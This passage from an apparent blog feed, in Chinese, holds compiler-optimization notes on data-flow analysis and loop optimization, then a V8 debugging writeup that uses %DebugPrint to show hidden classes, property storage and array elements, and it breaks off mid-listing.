src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-022906.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-023040.png" alt=""><br>关键问题，如何自动识别公共子表达式？<h3 id="删除无用代码"><a href="#删除无用代码" class="headerlink" title="删除无用代码"></a>删除无用代码</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024246.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024335.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024416.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-024428.png" alt=""><br>关键问题，如何自动识别无用代码？<h3 id="常量合并"><a href="#常量合并" class="headerlink" title="常量合并"></a>常量合并</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-140909.png" alt=""><h3 id="循环代码外提"><a href="#循环代码外提" class="headerlink" title="循环代码外提"></a>循环代码外提</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-140931.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141008.png" alt=""><h3 id="强度削弱"><a href="#强度削弱" class="headerlink" title="强度削弱"></a>强度削弱</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141029.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141118.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141528.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141551.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141601.png" alt=""><h3 id="基本块的优化"><a href="#基本块的优化" class="headerlink" title="基本块的优化"></a>基本块的优化</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141902.png" alt=""></li></ul></li></ul><h2 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-151922.png" alt=""><br>s是一个语句，所以说数据流值在经过s之后会变化发，所谓传递函数。</p><h3 id="到达定值分析"><a href="#到达定值分析" class="headerlink" title="到达定值分析"></a>到达定值分析</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-152723.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153258.png" alt=""><br>注意KILL这个概念，是变量x被重新赋值，则原来的定值（语句）被杀死。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153356.png" alt=""> </p><h4 id="到达定值分析的用途"><a href="#到达定值分析的用途" class="headerlink" title="到达定值分析的用途"></a>到达定值分析的用途</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153721.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153828.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153905.png" alt=""></p><h4 id="杀死与生成"><a href="#杀死与生成" class="headerlink" title="杀死与生成"></a>杀死与生成</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153944.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-154554.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-154644.png" alt=""></p><h4 id="到达定值分析的算法"><a href="#到达定值分析的算法" class="headerlink" title="到达定值分析的算法"></a>到达定值分析的算法</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-160029.png" alt=""><br>kill置为0，gen置为1<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-160049.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-160351.png" alt=""></p><h3 id="活跃变量分析"><a href="#活跃变量分析" class="headerlink" title="活跃变量分析"></a>活跃变量分析</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-132942.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133257.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133312.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133357.png" alt=""><br>活跃变量就是定义了以后会被用到嘛2333</p><p>因为这是一个逆向数据流问题，所以用x表示在基本块出口处的活跃变量的集合，f(x)表示基本块入口处活跃变量的集合。</p><p>use表示在基本块中首次出现，以引用形式出现的变量的集合，所以这些变量在基本块入口处肯定是活跃的。</p><p>def表示在基本块中首次出现，以定值形式出现的变量的集合，所以这些变量在基本块入口处肯定是不活跃的。<br>所以说def杀死了某些变量在基本块入口处成为活跃变量的可能性。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133603.png" alt=""><br>解释一下B2，i和j在基本块B2中都是以引用形式首次出现，所以在use里，而def为∅<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-135226.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-135254.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-135308.png" alt=""><br>得到活跃变量表<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-140845.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-140935.png" alt=""></p><h3 id="可用表达式分析"><a href="#可用表达式分析" class="headerlink" title="可用表达式分析"></a>可用表达式分析</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141147.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141741.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141807.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141913.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-142025.png" alt=""><br>z=x op y生成了表达式x op y，加入gen<br>同时这条语句对z定值，于是删除与z相关的表达式。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-142153.png" alt=""><br>z = x op y，于是从kill中删除表达式x op y，代表它复活了。<br>同时这条语句对z定值，于是把和z相关的表达式加入kill中</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-142219.png" alt=""><br><strong>注意是IN的交集</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-143437.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-143405.png" alt=""></p><h2 id="对循环的优化"><a href="#对循环的优化" class="headerlink" title="对循环的优化"></a>对循环的优化</h2><p>要想对循环进行优化，首先要识别出流图中的循环。</p><h3 id="支配节点（Dominators-和回边"><a href="#支配节点（Dominators-和回边" class="headerlink" title="支配节点（Dominators)和回边"></a>支配节点（Dominators)和回边</h3><ul><li><p>支配节点<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144116.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144133.png" alt=""><br>在支配节点树中，每个节点只支配它和它的后代节点。<br>可以看出一个节点可能会有若干个支配节点，于是给出直接支配节点的定义<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144340.png" alt=""><br>寻找支配节点是一个数据流问题<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144426.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-145018.png" alt=""><br><strong>注意交运算，所以初始化时初始为全集</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-145033.png" alt=""></p></li><li><p>回边<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-151633.png" alt=""></p></li></ul><h3 id="自然循环及其识别"><a href="#自然循环及其识别" class="headerlink" title="自然循环及其识别"></a>自然循环及其识别</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-151758.png" alt=""><br>如图2和3不存在彼此支配的关系，2和3构成了一个循环，控制既可以从2，也可以从3号节点进入，这样循环的入口节点就不唯一了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152115.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152330.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152636.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152727.png" alt=""></p><h3 id="删除全局子表达式"><a href="#删除全局子表达式" class="headerlink" title="删除全局子表达式"></a>删除全局子表达式</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152910.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152950.png" alt=""></p><h3 id="删除复制语句"><a href="#删除复制语句" class="headerlink" title="删除复制语句"></a>删除复制语句</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-153333.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154117.png" alt=""><br>注意到达定义分析是并 IN[P]，可用表达式分析是交 IN[P]</p><h3 id="代码移动"><a href="#代码移动" class="headerlink" title="代码移动"></a>代码移动</h3><ul><li>循环不变计算</li><li>代码外提<h4 id="循环不变计算"><a href="#循环不变计算" class="headerlink" title="循环不变计算"></a>循环不变计算</h4>一条语句是循环不变，当且仅当运算分量的值在循环中不变</li></ul><ol><li>运算分量是常数</li><li>运算分量的所有定值点在循环以外</li><li>运算分量只有一个到达定值，且在循环以内，且该定值本身就是循环内的一个不变计算。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154548.png" alt=""><h4 id="代码外提"><a href="#代码外提" class="headerlink" title="代码外提"></a>代码外提</h4><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154657.png" alt=""></li></ol><p>注意不一定所有的循环不变量都能外提<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154741.png" alt=""><br>如图，B2并不一定被执行，那么其中的代码外提就是错误的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-155000.png" alt=""><br>如果还有其他语句对x赋值，那么就有可能让原来的定值语句被杀死。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-155424.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-155708.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-160015.png" alt=""></p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> compiler </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>v8 debug writeup</title>
      <link href="/2018/08/02/v8_debug/"/>
      <url>/2018/08/02/v8_debug/</url>
      <content type="html"><![CDATA[<h2 id="v8-hidden-class-test"><a href="#v8-hidden-class-test" class="headerlink" title="v8 hidden class test"></a>v8 hidden class test</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><h4 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>.x = x;</span><br><span class="line"> <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line">%DebugPrint(p1)</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> Point(<span class="number">12</span>, <span class="number">13</span>);</span><br><span class="line">%DebugPrint(p2)</span><br></pre></td></tr></table></figure><p><code>./d8 --allow_natives_syntax test_hidden_class.js</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-14-131739.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">DebugPrint: 0x27984250c879: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x1e016e18f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x27984250c749</span><br><span class="line"> - elements = 0x23ac56e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x23ac56e02241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 10 (data field 0)</span><br><span class="line">    #y: 11 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x1e016e18f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e016e18f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x27984250c919 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x27984250c749 &lt;Object map = 0x1e016e18f829&gt;</span><br><span class="line"> - constructor: 0x2672a3c30041 &lt;JSFunction Point (sfi = 0x2672a3c2fc91)&gt;</span><br><span class="line"> - code cache: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x27984250c969: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x1e016e18f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x27984250c749</span><br><span class="line"> - elements = 0x23ac56e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x23ac56e02241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x1e016e18f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e016e18f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x27984250c919 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x27984250c749 &lt;Object map = 0x1e016e18f931&gt;</span><br><span class="line"> - constructor: 0x2672a3c30041 &lt;JSFunction Point (sfi = 0x2672a3c2fc91)&gt;</span><br><span class="line"> - code cache: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br></pre></td></tr></table></figure><p>结论：相同的map值</p><h4 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h4><p>add p2.z = 14;<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-074842.jpg" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/v8/v8/out.gn/x64.debug$ ./d8 --allow_natives_syntax test.js </span><br><span class="line">DebugPrint: 0x252f4f50c891: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 10 (data field 0)</span><br><span class="line">    #y: 11 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x2d1249b8f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x252f4f50c931 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f829&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x252f4f50c981: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f8d9 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x2d1249b8f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x252f4f50c931 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f931&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x252f4f50c981: [JS_OBJECT_TYPE]</span><br><span class="line"> - map = 0x2d1249b8f989 [FastProperties]</span><br><span class="line"> - prototype = 0x252f4f50c761</span><br><span class="line"> - elements = 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties = 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line">    #z: 14 (data field 2)</span><br><span class="line"> &#125;</span><br><span class="line"> 0x2d1249b8f989: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 7</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f8d9 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #3: 0x252f4f50ca51 &lt;FixedArray[11]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map = 0x2d1249b8f931&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi = 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br></pre></td></tr></table></figure></p><p>结论：指向一个新的map</p><h3 id="property的管理方法"><a href="#property的管理方法" class="headerlink" title="property的管理方法"></a>property的管理方法</h3><h4 id="In-Object-Properties"><a href="#In-Object-Properties" class="headerlink" title="In-Object Properties"></a>In-Object Properties</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>.x = x;</span><br><span class="line"> <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line">%DebugPrint(p1)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-144639.png" alt="">V8支持所谓的对象内属性，它们被直接保存在对象上，和对象在同一块内存区域。这种属性是V8中速度最快的属性，能够被直接访问。对象内属性的个数由对象初始化大小决定。如果要添加的属性超出对象的大小，这些属性就会被放入properties store中。properties store会增加一层属性访问的消耗，但是不受大小的限制。 </p><h4 id="Fast-Properties"><a href="#Fast-Properties" class="headerlink" title="Fast Properties"></a>Fast Properties</h4><p>一般来说，我们会把属性保存在线性的properties store中，作为快速属性。快速属性可以通过简单的索引在properties store中访问。不过为了从属性名从properties store获取实际位置，我们要去HiddenClass上的 descriptor array中查询 。具体来讲，这一步骤是先根据属性名搜寻隐藏类的descriptor array，然后得到到数组的偏移地址，然后根据偏移地址到properties store上读取属性信息。实际上，第一次查找属性的时候难免会经历一次隐藏类的哈希查找，但下次一般会结合内联缓存，直接采用缓存的位移来存取属性。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-080119.jpg" alt=""></p><h4 id="Slow-Properties"><a href="#Slow-Properties" class="headerlink" title="Slow Properties"></a>Slow Properties</h4><p>  然而，若是有很多属性从对象上添加或者删除，就需要花费很多时间和内存来维护descriptor array以及隐藏类。因此，V8也支持所谓的慢属性。拥有慢属性的对象会拥有一个自给的字典作为它的properties store（如上图所示）。这种情况下，所有属性的元信息不再储存在隐藏类的descriptor array中，而是直接保存在属性字典上。因此，此时属性的添加和移除不用再去更新指向的隐藏类。因为内联缓存不适用保存在字典中的属性，所以慢属性一般要比快属性慢。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-080209.jpg" alt=""></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>列表内容有三种不同类型的命名属性：对象内属性，快属性，以及慢/字典属性。<br>  1. 对象内属性直接储存在对象自身上，提供最快的属性访问。<br>  2. 快属性活跃在properties store上，所有相关的元信息都在隐藏类的descriptor array中。<br>  3. 慢属性保存在一个自给的属性字典上，属性的元信息不再与隐藏类有关。<br>慢属性提供高效的属性添加删除，但是访问速度要慢于快速属性和对象内对象。</p><h2 id="Elements-or-array-indexed-Properties"><a href="#Elements-or-array-indexed-Properties" class="headerlink" title="Elements or array-indexed Properties"></a>Elements or array-indexed Properties</h2><p>  目前为止我们介绍了命名属性并且忽略了通常出现在数组中的整数索引属性。处理这种整数型属性要比命名属性简单很多。<br>所有的整数型属性都被单独保存在一个elements store中，并且有多达20种元素类型。</p><h3 id="Packed-or-Holey-Elements"><a href="#Packed-or-Holey-Elements" class="headerlink" title="Packed or Holey Elements"></a>Packed or Holey Elements</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> o = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>];</span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "b".</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line"><span class="keyword">delete</span> o[<span class="number">1</span>];                <span class="comment">// Introduces a hole in the elements store.</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "undefined"; property 1 does not exist.</span></span><br><span class="line">o.__proto__ = &#123;<span class="number">1</span>: <span class="string">"B"</span>&#125;;     <span class="comment">// Define property 1 on the prototype.</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line">print(o[<span class="number">0</span>]);          <span class="comment">// Prints "a".</span></span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "B".</span></span><br><span class="line">print(o[<span class="number">2</span>]);          <span class="comment">// Prints "c".</span></span><br><span class="line">print(o[<span class="number">3</span>]);          <span class="comment">// Prints undefined</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 